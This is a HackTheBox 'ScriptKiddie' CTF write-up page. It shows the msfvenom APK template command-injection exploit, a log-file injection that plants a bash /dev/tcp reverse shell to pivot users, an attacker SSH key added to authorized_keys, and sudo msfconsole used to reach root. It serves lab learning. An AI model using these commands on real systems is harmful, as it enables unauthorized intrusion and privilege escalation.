<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>ScriptKiddie | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="ScriptKiddie HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/scriptkiddie/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/scriptkiddie/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="ScriptKiddie "><meta property="og:description" content="ScriptKiddie HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/scriptkiddie.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-06-06T15:15:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/scriptkiddie.png"><meta name=twitter:title content="ScriptKiddie "><meta name=twitter:description content="ScriptKiddie HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"ScriptKiddie ","item":"https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"ScriptKiddie ","name":"ScriptKiddie ","description":"ScriptKiddie HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"Information Name: ScriptKiddie Profile: www.hackthebox.eu Difficulty: Easy OS: Linux Points: 20 Overview Install tools used in this WU on BlackArch Linux:\n$ sudo pacman -S nmap metasploit pwncat Note: IP is different because of release arena (10.10.10.226)\nNetwork enumeration Port and service scan with nmap:\n# Nmap 7.91 scan initiated Mon Feb 8 19:00:29 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.129.77.135 Nmap scan report for 10.129.77.135 Host is up (0.029s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA) | 256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA) |_ 256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519) 5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5) | http-methods: |_ Supported Methods: POST HEAD GET OPTIONS |_http-title: k1d'5 h4ck3r t00l5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Feb 8 19:00:54 2021 -- 1 IP address (1 host up) scanned in 25.42 seconds Web exploitation A python web server (Werkzeug) is running at http://10.129.77.135:5000/.\nThe page is named k1d'5 h4ck3r t00l5 and allow us to use some commands:\nnmap: nmap payloads: msfvenom from metasploit sploits: searchploit from exploit-db On the msfvenom, we have the option to upload a custom template.\nBut there is a new vulnerability:\nThis module exploits a command injection vulnerability in Metasploit Framework’s msfvenom payload generator when using a crafted APK file as an Android payload template. Affects Metasploit Framework \u003c= 6.0.11 and Metasploit Pro \u003c= 4.18.0. The file produced by this module is a relatively empty yet valid-enough APK file. To trigger the vulnerability, the victim user should do the following: msfvenom -p android/\u003c…\u003e -x msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) \u003e options Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection): Name Current Setting Required Description ---- --------------- -------- ----------- FILENAME msf.apk yes The APK file name Payload options (cmd/unix/reverse_netcat): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST tun0 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port **DisablePayloadHandler: True (no handler will be created!)** Exploit target: Id Name -- ---- 0 Automatic msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) \u003e run [+] msf.apk stored at /home/cyfun/.msf4/local/msf.apk Then we select android, specify our template and set whatever a lhost.\nOn our machine we just launch a listener:\n$ pwncat -l 4444 -vv INFO: Listening on :::4444 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:4444 (family 2/IPv4, TCP) INFO: Client connected from 10.129.77.135:43478 (family 2/IPv4, TCP) id uid=1000(kid) gid=1000(kid) groups=1000(kid) System exploitation Let’s see where we are and locate the flag:\n$ ls -lhA total 20K drwxrwxr-x 2 kid kid 4.0K Feb 3 07:40 __pycache__ -rw-rw-r-- 1 kid kid 4.4K Feb 3 11:03 app.py drwxrwxr-x 3 kid kid 4.0K Feb 3 07:40 static drwxrwxr-x 2 kid kid 4.0K Feb 3 07:40 templates $ pwd /home/kid/html $ ls -lhA .. total 52K lrwxrwxrwx 1 root kid 9 Jan 5 20:31 .bash_history -\u003e /dev/null -rw-r--r-- 1 kid kid 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 kid kid 3.7K Feb 25 2020 .bashrc drwxrwxr-x 3 kid kid 4.0K Feb 3 07:40 .bundle drwx------ 2 kid kid 4.0K Feb 3 07:40 .cache drwx------ 4 kid kid 4.0K Feb 3 11:49 .gnupg drwxrwxr-x 3 kid kid 4.0K Feb 3 07:40 .local drwxr-xr-x 9 kid kid 4.0K Feb 3 07:40 .msf4 -rw-r--r-- 1 kid kid 807 Feb 25 2020 .profile drwx------ 2 kid kid 4.0K Feb 3 07:40 .ssh -rw-r--r-- 1 kid kid 0 Jan 5 11:10 .sudo_as_admin_successful drwxrwxr-x 5 kid kid 4.0K Feb 3 11:03 html drwxrwxrwx 2 kid kid 4.0K Feb 3 07:40 logs drwxr-xr-x 3 kid kid 4.0K Feb 3 11:48 snap -r-------- 1 kid kid 33 Jan 5 20:45 user.txt $ cat ../user.txt # /home/kid/user.txt 4cbc*************************08a Privilege Escalation of Machine : from kid to pwn Let’s find if there is another user flag:\nkid@scriptkiddie:~$ find / -name user.txt -type f 2\u003e/dev/null /home/kid/user.txt No there isn’t. But we can loot kid’s private key to have a better shell.\n$ chmod 600 id_rsa_kid $ ssh kid@10.129.77.135 -i id_rsa_kid Note: has been patched, there is no longer some ssh key but we can add ours: printf %s 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDGLndVd+2+y7FE7nVTrMtBvPiLNTMgObVw8s7d9B8n cyfun@penarch' \u003e\u003e /home/kid/.ssh/authorized_keys.\nThere is another user named pwn owning a script: /home/pwn/scanlosers.sh.\n#!/bin/bash log=/home/kid/logs/hackers cd /home/pwn/ cat $log | cut -d' ' -f3- | sort -u | while read ip; do sh -c \"nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2\u003e\u00261 \u003e/dev/null\" \u0026 done if [[ $(wc -l \u003c $log) -gt 0 ]]; then echo -n \u003e $log; fi We have write access to /home/kid/logs/hackers. We can see that our date and IP is written to this file when we try to bypass the searchploit function:\n/home/kid/html/app.py\nimport datetime import os import random import re import subprocess import tempfile import time from flask import Flask, render_template, request from hashlib import md5 from werkzeug.utils import secure_filename regex_ip = re.compile(r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$') regex_alphanum = re.compile(r'^[A-Za-z0-9 \\.]+$') OS_2_EXT = {'windows': 'exe', 'linux': 'elf', 'android': 'apk'} app = Flask(__name__) @app.route('/', methods=['GET','POST']) def index(): if request.method == 'GET' or not 'action' in request.form: return render_template('index.html') elif request.form['action'] == 'scan': return scan(request.form['ip']) elif request.form['action'] == 'generate': return venom(request) elif request.form['action'] == 'searchsploit': return searchsploit(request.form['search'], request.remote_addr) print(\"no valid action\") return request.form def scan(ip): if regex_ip.match(ip): if not ip == request.remote_addr and ip.startswith('10.10.1') and not ip.startswith('10.10.10.'): stime = random.randint(200,400)/100 time.sleep(stime) result = f\"\"\"Starting Nmap 7.80 ( https://nmap.org ) at {datetime.datetime.utcnow().strftime(\"%Y-%m-%d %H:%M\")} UTC\\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds\"\"\".encode() else: result = subprocess.check_output(['nmap', '--top-ports', '100', ip]) return render_template('index.html', scan=result.decode('UTF-8', 'ignore')) return render_template('index.html', scanerror=\"invalid ip\") def searchsploit(text, srcip): if regex_alphanum.match(text): result = subprocess.check_output(['searchsploit', '--color', text]) return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore')) else: with open('/home/kid/logs/hackers', 'a') as f: f.write(f'[{datetime.datetime.now()}] {srcip}\\n') return render_template('index.html', sserror=\"stop hacking me - well hack you back\") def venom(request): errors = [] file = None if not 'lhost' in request.form: errors.append('lhost missing') else: lhost = request.form['lhost'] if not regex_ip.match(lhost): errors.append('invalid lhost ip') if not 'os' in request.form: errors.append('os missing') else: tar_os = request.form['os'] if tar_os not in ['windows', 'linux', 'android']: errors.append(f'invalid os: {tar_os}') if 'template' in request.files and request.files['template'].filename != '': file = request.files['template'] if not ('.' in file.filename and file.filename.split('.')[-1] == OS_2_EXT[tar_os]): errors.append(f'{tar_os} requires a {OS_2_EXT[tar_os]} ext template file') else: template_name = secure_filename(file.filename) template_ext = file.filename.split('.')[-1] template_file = tempfile.NamedTemporaryFile('wb', suffix='.'+template_ext) file.save(template_file.name) else: template_name = \"None\" if errors: return render_template('index.html', payloaderror='\\n'.join(errors)) payload = f'{tar_os}/meterpreter/reverse_tcp' outfilename = md5(request.remote_addr.encode()).hexdigest()[:12] + '.' + OS_2_EXT[tar_os] outfilepath = os.path.join(app.root_path, 'static', 'payloads', outfilename) try: if file: print(f'msfvenom -x {template_file.name} -p {payload} LHOST={lhost} LPORT=4444') result = subprocess.check_output(['msfvenom', '-x', template_file.name, '-p', payload, f'LHOST={lhost}', 'LPORT=4444', '-o', outfilepath]) template_file.close() else: result = subprocess.check_output(['msfvenom', '-p', payload, f'LHOST={lhost}', 'LPORT=4444', '-o', outfilepath]) except subprocess.CalledProcessError: return render_template('index.html', payloaderror=\"Something went wrong\") return render_template('index.html', payload=payload, lhost=lhost, lport=4444, template=template_name, fn=outfilename) if __name__ == '__main__': app.run(host='0.0.0.0') So normally /home/pwn/scanlosers.sh will scan us back.\nThe logs file should contains lines like this one:\n2021-02-08 19:54:33.513581 1.1.1.1 And when we try to “hack” searchploit, it voids the file instead of appending a new line.\nThere is /usr/sbin/incrond running so there is maybe a root job starting /home/pwn/scanlosers.sh or something similar.\nLet’s upload and launch pspy to confirm that.\nOn our machine:\n$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 $ ruby -run -ehttpd . -p8080 On the target machine:\nkid@scriptkiddie:~$ wget http://10.10.14.135:8080/pspy64 kid@scriptkiddie:~$ chmod u+x pspy64 kid@scriptkiddie:~$ ./pspy64 If we go trigger the searchsploit security filter we can see this on pspy:\n2021/02/08 21:30:37 CMD: UID=1001 PID=2221 | /bin/bash /home/pwn/scanlosers.sh 2021/02/08 21:30:37 CMD: UID=1001 PID=2225 | /bin/bash /home/pwn/scanlosers.sh 2021/02/08 21:30:37 CMD: UID=1001 PID=2226 | sh -c nmap --top-ports 10 -oN recon/10.10.14.135.nmap 10.10.14.135 2\u003e\u00261 \u003e/dev/null 2021/02/08 21:30:37 CMD: UID=1001 PID=2228 | nmap --top-ports 10 -oN recon/10.10.14.135.nmap 10.10.14.135 2021/02/08 21:30:37 CMD: UID=1001 PID=2231 | /bin/bash /home/pwn/scanlosers.sh 2021/02/08 21:30:37 CMD: UID=1001 PID=2237 | /bin/bash /home/pwn/scanlosers.sh 2021/02/08 21:30:37 CMD: UID=1001 PID=2236 | /bin/bash /home/pwn/scanlosers.sh 2021/02/08 21:30:37 CMD: UID=0 PID=2238 | /lib/systemd/systemd-udevd 2021/02/08 21:30:48 CMD: UID=0 PID=2239 | /usr/sbin/incrond 2021/02/08 21:30:48 CMD: UID=1001 PID=2240 | sed -i s/open /closed/g /home/pwn/recon/sed6xfScv 2021/02/08 21:30:48 CMD: UID=0 PID=2241 | /bin/sh /sbin/dhclient-script 2021/02/08 21:30:48 CMD: UID=??? PID=2243 | ??? 1001 is the id of pwn, so we’ll get a shell as pwn.\nLet’s craft a reverse shell payload and put it in place:\n$ printf %s \"cyfun cyfun ;/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.135/9999 0\u003e\u00261' #\" \u003e /home/kid/logs/hackers Note: respect the log format else the cut in the script will fails to parse\nOnce injected in /home/pwn/scanlosers.sh the command executed by pwn incron job will be:\nnmap --top-ports 10 -oN recon/ ;/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.135/9999 0\u003e\u00261' #.nmap ;/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.135/9999 0\u003e\u00261' # 2\u003e\u00261 \u003e/dev/null Then we start a listener pwncat -l 9999 -vv.\nPrivilege Escalation of Machine : from pwn to root We can root msfconsole as root.\npwn@scriptkiddie:~$ sudo -l Matching Defaults entries for pwn on scriptkiddie: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User pwn may run the following commands on scriptkiddie: (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole It will be EZ because we it’s an interpretter where we can directly pass system commands or open irb ruby interpreter.\nmsf6 \u003e cat /root/root.txt stty: 'standard input': Inappropriate ioctl for device [*] exec: cat /root/root.txt 40aa*********************75f ","wordCount":"1507","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/scriptkiddie/scriptkiddie.png","datePublished":"2021-06-06T15:15:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">ScriptKiddie</h1><div class=post-description>ScriptKiddie HackTheBox writeup</div><div class=post-meta>&lt;span title='2021-06-06 15:15:00 +0000 UTC'>June 6, 2021&lt;/span>&amp;nbsp;·&amp;nbsp;8 min&amp;nbsp;·&amp;nbsp;1507 words&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/tags/ctf/" class="post-tag" title="ctf">ctf&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/hackthebox/" class="post-tag" title="hackthebox">hackthebox&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/penetration-testing/" class="post-tag" title="penetration-testing">penetration-testing&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/writeup/" class="post-tag" title="writeup">writeup&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/linux/" class="post-tag" title="linux">linux&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/easy/" class="post-tag" title="easy">easy&lt;/a>
&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/categories/writeups/" class="post-tag" title="writeups">writeups&lt;/a>
&amp;nbsp;·&amp;nbsp;&lt;a href=".RelPermalink">permalink&lt;/a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/scriptkiddie/scriptkiddie.png alt="ScriptKiddie HackTheBox Machine"><p>ScriptKiddie - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#web-exploitation>Web exploitation</a></li><li><a href=#system-exploitation>System exploitation</a></li><li><a href=#privilege-escalation-of-machine--from-kid-to-pwn>Privilege Escalation of Machine : from kid to pwn</a></li><li><a href=#privilege-escalation-of-machine--from-pwn-to-root>Privilege Escalation of Machine : from pwn to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> ScriptKiddie</li><li><strong>Profile:</strong> <a href=https://app.hackthebox.eu/machines/314>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ sudo pacman -S nmap metasploit pwncat
</code></pre><p>Note: IP is different because of release arena (10.10.10.226)</p><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service scan with nmap:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.91 scan initiated Mon Feb  8 19:00:29 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.129.77.135
</span></span><span style=display:flex><span>Nmap scan report for 10.129.77.135
</span></span><span style=display:flex><span>Host is up (0.029s latency).
</span></span><span style=display:flex><span>Not shown: 65533 closed ports
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
</span></span><span style=display:flex><span>|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
</span></span><span style=display:flex><span>|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
</span></span><span style=display:flex><span>5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
</span></span><span style=display:flex><span>| http-methods:
</span></span><span style=display:flex><span>|_  Supported Methods: POST HEAD GET OPTIONS
</span></span><span style=display:flex><span>|_http-title: k1d&#39;5 h4ck3r t00l5
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span># Nmap done at Mon Feb  8 19:00:54 2021 -- 1 IP address (1 host up) scanned in 25.42 seconds
</span></span></code></pre></div><h2 id=web-exploitation>Web exploitation<a hidden class=anchor aria-hidden=true href=#web-exploitation>#</a></h2><p>A python web server (Werkzeug) is running at http://10.129.77.135:5000/.</p><p>The page is named <code>k1d'5 h4ck3r t00l5</code> and allow us to use some commands:</p><ul><li>nmap: nmap</li><li>payloads: msfvenom from metasploit</li><li>sploits: searchploit from exploit-db</li></ul><p>On the msfvenom, we have the option to upload a custom template.</p><p>But there is a new vulnerability:</p><blockquote><p>This module exploits a command injection vulnerability in Metasploit
Framework&rsquo;s msfvenom payload generator when using a crafted APK file
as an Android payload template. Affects Metasploit Framework &lt;=
6.0.11 and Metasploit Pro &lt;= 4.18.0. The file produced by this
module is a relatively empty yet valid-enough APK file. To trigger
the vulnerability, the victim user should do the following: msfvenom
-p android/&lt;&mldr;> -x &lt;crafted_file.apk></p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name      Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----      ---------------  --------  -----------
</span></span><span style=display:flex><span>   FILENAME  msf.apk          yes       The APK file name
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Payload options (cmd/unix/reverse_netcat):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name   Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----   ---------------  --------  -----------
</span></span><span style=display:flex><span>   LHOST  tun0             yes       The listen address (an interface may be specified)
</span></span><span style=display:flex><span>   LPORT  4444             yes       The listen port
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   **DisablePayloadHandler: True   (no handler will be created!)**
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Exploit target:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Id  Name
</span></span><span style=display:flex><span>   --  ----
</span></span><span style=display:flex><span>   0   Automatic
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; run
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[+] msf.apk stored at /home/cyfun/.msf4/local/msf.apk
</span></span></code></pre></div><p>Then we select <code>android</code>, specify our template and set whatever a lhost.</p><p>On our machine we just launch a listener:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ pwncat -l 4444 -vv
</span></span><span style=display:flex><span>INFO: Listening on :::4444 (family 10/IPv6, TCP)
</span></span><span style=display:flex><span>INFO: Listening on 0.0.0.0:4444 (family 2/IPv4, TCP)
</span></span><span style=display:flex><span>INFO: Client connected from 10.129.77.135:43478 (family 2/IPv4, TCP)
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid=1000(kid) gid=1000(kid) groups=1000(kid)
</span></span></code></pre></div><h2 id=system-exploitation>System exploitation<a hidden class=anchor aria-hidden=true href=#system-exploitation>#</a></h2><p>Let&rsquo;s see where we are and locate the flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ ls -lhA
</span></span><span style=display:flex><span>total 20K
</span></span><span style=display:flex><span>drwxrwxr-x 2 kid kid 4.0K Feb  3 07:40 __pycache__
</span></span><span style=display:flex><span>-rw-rw-r-- 1 kid kid 4.4K Feb  3 11:03 app.py
</span></span><span style=display:flex><span>drwxrwxr-x 3 kid kid 4.0K Feb  3 07:40 static
</span></span><span style=display:flex><span>drwxrwxr-x 2 kid kid 4.0K Feb  3 07:40 templates
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ pwd
</span></span><span style=display:flex><span>/home/kid/html
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ ls -lhA ..
</span></span><span style=display:flex><span>total 52K
</span></span><span style=display:flex><span>lrwxrwxrwx 1 root kid    9 Jan  5 20:31 .bash_history -&gt; /dev/null
</span></span><span style=display:flex><span>-rw-r--r-- 1 kid  kid  220 Feb 25  2020 .bash_logout
</span></span><span style=display:flex><span>-rw-r--r-- 1 kid  kid 3.7K Feb 25  2020 .bashrc
</span></span><span style=display:flex><span>drwxrwxr-x 3 kid  kid 4.0K Feb  3 07:40 .bundle
</span></span><span style=display:flex><span>drwx------ 2 kid  kid 4.0K Feb  3 07:40 .cache
</span></span><span style=display:flex><span>drwx------ 4 kid  kid 4.0K Feb  3 11:49 .gnupg
</span></span><span style=display:flex><span>drwxrwxr-x 3 kid  kid 4.0K Feb  3 07:40 .local
</span></span><span style=display:flex><span>drwxr-xr-x 9 kid  kid 4.0K Feb  3 07:40 .msf4
</span></span><span style=display:flex><span>-rw-r--r-- 1 kid  kid  807 Feb 25  2020 .profile
</span></span><span style=display:flex><span>drwx------ 2 kid  kid 4.0K Feb  3 07:40 .ssh
</span></span><span style=display:flex><span>-rw-r--r-- 1 kid  kid    0 Jan  5 11:10 .sudo_as_admin_successful
</span></span><span style=display:flex><span>drwxrwxr-x 5 kid  kid 4.0K Feb  3 11:03 html
</span></span><span style=display:flex><span>drwxrwxrwx 2 kid  kid 4.0K Feb  3 07:40 logs
</span></span><span style=display:flex><span>drwxr-xr-x 3 kid  kid 4.0K Feb  3 11:48 snap
</span></span><span style=display:flex><span>-r-------- 1 kid  kid   33 Jan  5 20:45 user.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ cat ../user.txt # /home/kid/user.txt
</span></span><span style=display:flex><span>4cbc*************************08a
</span></span></code></pre></div><h2 id=privilege-escalation-of-machine--from-kid-to-pwn>Privilege Escalation of Machine : from kid to pwn<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-kid-to-pwn>#</a></h2><p>Let&rsquo;s find if there is another user flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>kid@scriptkiddie:~$ find / -name user.txt -type f 2&gt;/dev/null
</span></span><span style=display:flex><span>/home/kid/user.txt
</span></span></code></pre></div><p>No there isn&rsquo;t. But we can loot kid&rsquo;s private key to have a better shell.</p><pre tabindex=0><code>$ chmod 600 id_rsa_kid
$ ssh kid@10.129.77.135 -i id_rsa_kid
</code></pre><p>Note: has been patched, there is no longer some ssh key but we can add ours:
